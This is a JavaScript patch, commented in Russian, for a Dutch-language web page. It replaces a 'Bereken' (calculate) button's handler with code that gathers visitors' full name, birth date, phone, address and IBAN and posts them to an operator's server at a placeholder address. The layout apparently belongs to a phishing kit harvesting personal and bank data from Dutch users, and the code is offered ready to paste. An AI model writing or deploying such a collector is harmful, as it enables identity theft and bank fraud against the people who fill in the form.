// ============================================================
//  site_patch.js — вставь этот блок в <script> на сайте
//  Вместо старого обработчика кнопки "Bereken".
//  Замени http://YOUR_SERVER:8080 на адрес, где крутится server.py
// ============================================================

(function () {
    var btn = document.querySelector('.panel-form .btn-calc');
    if (!btn) return;

    btn.addEventListener('click', function (e) {
        e.preventDefault();

        var fio      = (document.getElementById('fio')      || {}).value || '';
        var dob      = (document.getElementById('dob')      || {}).value || '';
        var phone    = (document.getElementById('phoneInput') || {}).value || '';
        var stad     = (document.querySelector('input[name="stad"]')     || {}).value || '';
        var straat   = (document.querySelector('input[name="straat"]')   || {}).value || '';
        var postcode = (document.querySelector('input[name="postcode"]') || {}).value || '';
        var ibanEl   = document.getElementById('iban');
        var iban     = (ibanEl && ibanEl.value ? ibanEl.value : '').replace(/\s+/g, '');

        // простая валидация
        if (!fio || !dob || !phone || !stad || !straat || !postcode || !iban) {
            alert('Vul alle velden in.');
            return;
        }

        var body = {
            fio: fio,
            dob: dob,
            phone: phone,
            stad: stad,
            straat: straat,
            postcode: postcode,
            iban: iban
        };

        fetch('http://YOUR_SERVER:8080/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        })
        .then(function (r) { return r.json(); })
        .then(function (res) {
            if (res.ok) {
                alert('Bedankt! Uw gegevens zijn verzonden.');
            } else {
                alert('Er is een fout opgetreden. Probeer het later opnieuw.');
            }
        })
        .catch(function () {
            alert('Verbindingsfout. Probeer het later opnieuw.');
        });
    });
})();